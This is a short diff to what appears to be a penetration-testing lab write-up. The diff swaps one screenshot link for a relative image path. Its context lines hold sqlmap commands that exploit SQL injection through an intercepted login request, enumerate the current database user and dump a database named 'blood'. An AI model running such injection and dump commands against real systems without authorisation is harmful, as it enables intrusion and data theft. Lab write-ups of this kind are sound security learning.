@@ -17,7 +17,7 @@ Now in login page intercept it with username and pass
 sqlmap -r Downloads/req.txt --current-user
 ```
 
-![[Pasted image 20260309165910.png]]
+![enum results](../NPT/Assets/130.png)
 
 ```
 sqlmap -r req.txt -D blood --dump
